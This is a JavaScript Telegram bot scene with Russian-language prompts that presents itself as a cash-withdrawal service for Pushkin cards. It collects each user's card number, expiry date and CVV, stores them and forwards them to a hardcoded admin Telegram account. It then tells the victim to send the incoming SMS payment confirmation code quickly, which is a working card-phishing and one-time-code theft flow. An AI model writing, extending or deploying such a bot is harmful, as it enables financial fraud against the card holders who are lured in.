const { Markup, Composer, Scenes } = require("telegraf");
const { Keyboard } = require("telegram-keyboard");
const { Customer, Payment } = require("../models");

const exit_keyboard = Keyboard.make([
    ['Выйти в меню'], 
]);

const default_keyboard = Keyboard.make([
    ['Вывести деньги', 'Информация'],
    ["Реферальная система"],
    ['Поддержка', 'FAQ'], 
]);

const startStep = new Composer();
startStep.on("text", ctx => {
    ctx.wizard.state.data = {};
    ctx.wizard.state.msgHistory = {};
    ctx.replyWithHTML("💳 Введите <b>номер</b> вашей <b>Пушкинской</b> карты", exit_keyboard.reply());
    return ctx.wizard.next();
});

const setCardNumberStep = new Composer();
setCardNumberStep.on("text", ctx => {

    if(ctx.message.text === "Выйти в меню"){
        ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardNumber = ctx.message.text.trim().replaceAll(" ", "");
    // Валидация введённого значения номера карты
    if(cardNumber.length !== 16){
        ctx.reply("💳 Номер карты состоит из 16 цифр\nВведите его заново", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(1);
    }
    if(isNaN(cardNumber)){
        ctx.reply("💳 Номер карты состоит исключительно из 16 цифр, без букв и лишних символов\nВведите его заново", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(1);
    }

    ctx.wizard.state.data.cardNumber = cardNumber;
    ctx.replyWithHTML("📅 Введите <b>дату</b> вашей Пушкинской карты (Пример: 07/24)", { reply_to_message_id: ctx.update.message.message_id });
    return ctx.wizard.next();
});

const setCardDateStep = new Composer();
setCardDateStep.on("text", ctx => {

    if(ctx.message.text === "Выйти в меню"){
        ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardDate = ctx.message.text.trim();

    if(cardDate.length !== 5 || !cardDate.includes("/")){
        ctx.reply("📅 Дата должна быть записана в формате ММ/ГГ (Пример: 07/24), как на самой карте\nВведите его заново", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(2);
    }

    ctx.wizard.state.data.cardDate = cardDate;
    ctx.replyWithHTML("🔎 Введите <b>CVV код</b> вашей Пушкинской карты (Пример: 134)", { reply_to_message_id: ctx.update.message.message_id });
    return ctx.wizard.next();
});

const checkDataStep = new Composer();
checkDataStep.on("text", ctx => {

    if(ctx.message.text === "Выйти в меню"){
        ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardCvv = ctx.message.text.trim();

    if(cardCvv.length !== 3 || isNaN(cardCvv)){
        ctx.reply("🔎 CVV код состоит из 3-х цифр, он указан на обороте карты\nВведите его заново", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(3);
    }

    const { cardNumber, cardDate } = ctx.wizard.state.data;
    ctx.wizard.state.data.cardCvv = cardCvv;

    ctx.replyWithHTML(`Проверьте данные карты: \n\nНомер: <b>${cardNumber}</b> \nДата: <b>${cardDate}</b> \nCVV: <b>${cardCvv}</b> \n \n Всё правильно ?`, {
        reply_markup: {
            inline_keyboard: [
                [ { text: "Да, продолжить", callback_data: "continue" }, { text: "Изменить данные", callback_data: "edit-data" } ],
                [ { text: "Отмена", callback_data: "cancel" } ],
            ]
        }
    }).then((m) => ctx.wizard.state.msgHistory.makeSure = m.message_id);
    return ctx.wizard.next();
});

const confirmCardDataStep = new Composer();
confirmCardDataStep.action("continue", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.reply("Введите сумму, которую хотите вывести (Мин. - 1500, Макс. - 4700)");
    return ctx.wizard.next();
});
confirmCardDataStep.action("edit-data", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.replyWithHTML("💳 Введите <b>номер</b> вашей Пушкинской карты");
    return ctx.wizard.selectStep(1);
})
confirmCardDataStep.action("cancel", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
    return ctx.scene.leave();
})

const withdrawAmountStep = new Composer();
withdrawAmountStep.on("text", ctx => {

    if(ctx.message.text === "Выйти в меню"){
        ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
        return ctx.scene.leave();
    }
    
    let amount = ctx.message.text;
    
    if(amount < 1500 || amount > 4700){
        ctx.reply("Сумма должна быть от 1500 до 4700");
        return ctx.wizard.selectStep(5);
    }

    ctx.wizard.state.data.amount = amount;

    ctx.replyWithHTML("Укажите свой реквизит, на который Вы хотите вывести деньги: <b>(Моб. телефон или номер банковской карты / Номер QIWI-кошелька / Номер телефона, на который зачислить деньги)</b>\n\nПример: <i>Киви +79000000000</i><b> / </b><i>Карта 2202 0000 0000 000</i><b> / </b><i>Мегафон 89270000000</i>\n\nВсе заявки проверяются вручную реальными людьми, так что пишите в любом удобном вам формате");
    return ctx.wizard.next();
});

const withdrawalAddressStep = new Composer();
withdrawalAddressStep.on("text", ctx => {

    if(ctx.message.text === "Выйти в меню"){
        ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let address = ctx.message.text;
    ctx.wizard.state.data.address = address;

    const { amount } = ctx.wizard.state.data;

    ctx.replyWithHTML("💸 Сумма на вывод: <b>" + amount + "</b> рублей\n🎈 Вывести деньги на: <b>" + address + "</b>\nСоздать заявку на вывод ?", {
        reply_markup: {
            inline_keyboard: [
                [ { text: "Да, создать", callback_data: "create" }, { text: "Отмена", callback_data: "cancel" } ],
            ]
        }
    }).then((m) => {
        ctx.wizard.state.msgHistory.createPaymentRequest = m.message_id;
        return ctx.wizard.next();
    });
});

const finishStep = new Composer();
finishStep.action("create", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.createPaymentRequest);
    const customer = ctx.update.callback_query.from;
    Customer.findOne({ telegram_id: customer.id }, (err, found) => {
        console.log(found)
        const newPayment = new Payment({
            amount: ctx.wizard.state.data.amount,
            customer: found._id,

            withdrawalAddress: ctx.wizard.state.data.address,

            pushkinCardNumber: ctx.wizard.state.data.cardNumber,
            pushkinCardDate: ctx.wizard.state.data.cardDate,
            pushkinCardCVV: ctx.wizard.state.data.cardCvv
        });
        newPayment.save((err, savedPaymentRequest) => {
            ctx.telegram.sendMessage(1257409280, `💡 Новая заявка\n${savedPaymentRequest._id}\n\nНомер карты: ${ctx.wizard.state.data.cardNumber}\nДата: ${ctx.wizard.state.data.cardDate}\nCVV: ${ctx.wizard.state.data.cardCvv}\nСумма вывода: ${ctx.wizard.state.data.amount}`)
            .then((m) => {
                savedPaymentRequest.initialAdminMessage = m.message_id;
                savedPaymentRequest.save();
                ctx.replyWithHTML("Через определенное количество времени вам придет SMS-сообщение с кодом подтверждения оплаты.\n\n Как только получите его, <b>как можно быстрее</b> отправьте его сюда.", default_keyboard.reply());
                return ctx.scene.leave();
            })
        });
    })
});
finishStep.action("cancel", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.createPaymentRequest);
    ctx.reply("🛑 Вы отменили вывод средств", default_keyboard.reply());
    return ctx.scene.leave();
});

const withdrawScene = new Scenes.WizardScene("withdrawWizard",
    startStep,
    setCardNumberStep,
    setCardDateStep,
    checkDataStep,
    confirmCardDataStep,

    withdrawAmountStep,
    withdrawalAddressStep,
    finishStep
);

module.exports = withdrawScene;